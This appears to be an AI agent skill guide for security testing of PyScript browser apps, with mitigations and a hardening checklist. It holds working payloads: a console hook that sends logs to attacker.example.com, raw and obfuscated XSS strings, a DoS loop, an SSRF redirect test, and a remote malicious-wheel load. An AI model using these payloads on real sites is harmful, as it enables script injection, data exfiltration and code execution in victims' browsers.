---
name: pyscript-pentest
description: PyScript vulnerability assessment and pentesting. Use this skill whenever the user mentions PyScript, Pyodide, browser-based Python, web application security testing, XSS in Python contexts, SSRF via Python libraries, or needs to assess PyScript implementations for security issues. Trigger for any security review, penetration testing, or vulnerability research involving PyScript or Python-in-browser technologies.
---

# PyScript Pentesting Skill

A comprehensive guide for assessing PyScript implementations for security vulnerabilities. PyScript enables Python execution in browsers via WebAssembly, introducing unique attack vectors.

## When to Use This Skill

Use this skill when:
- Reviewing a web application that uses PyScript or Pyodide
- Testing for XSS vulnerabilities in Python-rendered content
- Assessing SSRF risks in browser-based Python code
- Investigating file access vulnerabilities in PyScript environments
- Hardening PyScript deployments against known CVEs
- Creating security test cases for PyScript applications

## Core Vulnerability Categories

### 1. File System Access (CVE-2022-30286)

PyScript's Emscripten virtual filesystem can be accessed from Python code, potentially exposing sensitive files.

**Detection:**
```html
<py-script>
  with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin:
    out = fin.read()
    print(out)
</py-script>
```

**Impact:** Read access to Python standard library files, installed packages, and potentially user-uploaded content.

**Mitigation:**
- Keep PyScript updated to patched versions
- Restrict filesystem access via configuration
- Monitor for unexpected file read operations

### 2. Out-of-Band Data Exfiltration

Console monitoring can be hijacked to exfiltrate data via external requests.

**Detection Pattern:**
```html
<py-script>
  x = "CyberGuy"
  if x == "CyberGuy":
    with open('/lib/python3.10/asyncio/tasks.py') as output:
      contents = output.read()
      print(contents)
      print('''
      <script>
        console.pylog = console.log
        console.logs = []
        console.log = function () {
          console.logs.push(Array.from(arguments))
          console.pylog.apply(console, arguments)
          fetch("http://attacker.example.com/", {
            method: "POST",
            headers: { "Content-Type: text/plain;charset=utf-8" },
            body: JSON.stringify({ content: btoa(console.logs) }),
          })
        }
      </script>
      ''')
</py-script>
```

**Impact:** Sensitive data exfiltration via DNS or HTTP requests to attacker-controlled servers.

**Mitigation:**
- Implement Content Security Policy (CSP) to block external fetch requests
- Monitor network traffic for unexpected outbound connections
- Sanitize any user-controlled PyScript code

### 3. Cross-Site Scripting (XSS)

#### Ordinary XSS via print()

```html
<py-script>
  print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```

**Impact:** Standard XSS - session hijacking, credential theft, defacement.

#### Python String Obfuscation

```html
<py-script>
sur = "\u0027al"; fur = "e"; rt = "rt"
p = "\x22x$$\x22\x29\u0027\x3E"
s = "\x28"; pic = "\x3Cim"; pa = "g"; so = "sr"
e = "c\u003d"; q = "x"
y = "o"; m = "ner"; z = "ror\u003d"

print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>
```

**Impact:** Bypasses naive string-based WAFs that look for `<script>` or `alert(`.

#### JavaScript Obfuscation Injection

```html
<py-script>
  print("""
  <script>
    var _0x3675bf = _0x5cf5
    function _0x5cf5(_0xced4e9, _0x1ae724) {
      var _0x599cad = _0x599c()
      return (_0x5cf5 = function (_0x5cf5d2, _0x6f919d) {
        _0x5cf5d2 = _0x5cf5d2 - 0x94
        var _0x14caa7 = _0x599cad[_0x5cf5d2]
        return _0x14caa7
      }), _0x5cf5(_0xced4e9, _0x1ae724)
    }
    // ... obfuscated payload
  </script>
  """)
</py-script>
```

**Impact:** Advanced obfuscation bypasses most signature-based detection.

**Mitigation:**
- Use `display()` instead of `print()` for untrusted content (escapes HTML by default)
- Never echo user input into `<py-script>` tags
- Implement strict CSP: `script-src 'self' 'sha256-...'`

### 4. Denial of Service (DoS)

```html
<py-script>
  while True:
    print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
</py-script>
```

**Impact:** Browser tab freeze, resource exhaustion, potential browser crash.

**Mitigation:**
- Set execution timeouts in PyScript configuration
- Limit output size
- Use workers with resource constraints

### 5. Server-Side Request Forgery (CVE-2025-50182)

**Affected:** `urllib3 < 2.5.0` in Pyodide runtime

**Vulnerability:** Redirect and retry parameters are ignored inside Pyodide, bypassing SSRF protections.

**Detection:**
```html
<script type="py">
import urllib3
http = urllib3.PoolManager(retries=False, redirect=False)  # supposed to block redirects
r = http.request("GET", "https://evil.example/302")      # will STILL follow the 302
print(r.status, r.url)
</script>
```

**Impact:** Internal network scanning, metadata service access, bypassing network controls.

**Mitigation:**
- Upgrade to `urllib3 >= 2.5.0`
- Pin safe versions: `packages = ["urllib3>=2.5.0"]`
- Avoid external HTTP requests from PyScript when possible

### 6. Arbitrary Package Loading (Supply Chain)

```html
<py-config>
packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
</py-config>
<script type="py">
import payload  # executes attacker-controlled code during installation
</script>
```

**Impact:** Full code execution in victim's browser, data theft, malware delivery.

**Mitigation:**
- Never allow user-controlled `packages` configuration
- Use only PyPI package names or same-origin URLs
- Implement Subresource Integrity (SRI) hashes for external wheels
- Host trusted wheels on your own domain with HTTPS

## Output Sanitization (2023+)

**Critical:** `print()` injects raw HTML. Use `display()` for safe output.

```python
from pyscript import display, HTML

# UNSAFE - raw HTML injection
print("<b>bold</b>")  # executes as HTML

# SAFE - escaped by default
display("<b>bold</b>")  # renders as literal text

# Intentional HTML (use carefully)
display(HTML("<b>bold</b>"))  # executes as HTML
```

**Rule:** Always use `display()` for untrusted input. Only use `HTML()` wrapper when you control the content.

## Defensive Best Practices Checklist

- [ ] Keep PyScript and all packages updated
- [ ] Upgrade `urllib3 >= 2.5.0` to fix CVE-2025-50182
- [ ] Restrict package sources to PyPI or same-origin URLs
- [ ] Implement Subresource Integrity (SRI) for external wheels
- [ ] Harden CSP: `script-src 'self' 'sha256-...'`
- [ ] Sanitize all user input before echoing into `<py-script>` tags
- [ ] Use `display()` instead of `print()` for dynamic content
- [ ] Set execution timeouts to prevent DoS
- [ ] Enable `sync_main_only` flag if DOM access from workers isn't needed
- [ ] Monitor for unexpected outbound network requests
- [ ] Regularly audit PyScript configurations for user-controlled elements

## Testing Workflow

1. **Identify PyScript usage** - Look for `<py-script>`, `<script type="py">`, or `<py-config>` tags
2. **Check version** - Determine PyScript version to assess known CVEs
3. **Test file access** - Attempt to read sensitive paths via Python file operations
4. **Test XSS** - Inject payloads via `print()` and obfuscated strings
5. **Test SSRF** - Attempt to access internal resources via urllib/requests
6. **Test package loading** - Verify package sources are not user-controlled
7. **Review CSP** - Check if inline scripts are blocked
8. **Assess output handling** - Verify `display()` is used for untrusted content

## References

- [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
- [NVD – CVE-2022-30286](https://nvd.nist.gov/vuln/detail/CVE-2022-30286)
- [PyScript Built-ins documentation](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
- [PyScript Security Guide](https://docs.pyscript.net/latest/user-guide/security/)

## Important Notes

- This skill is for **authorized security testing only**. Always obtain proper authorization before testing.
- PyScript vulnerabilities are actively researched - stay updated on new CVEs.
- Browser-based Python execution is inherently risky - consider alternatives for sensitive applications.
- The `print()` function in PyScript is fundamentally unsafe for untrusted content - this is a design limitation, not a bug.
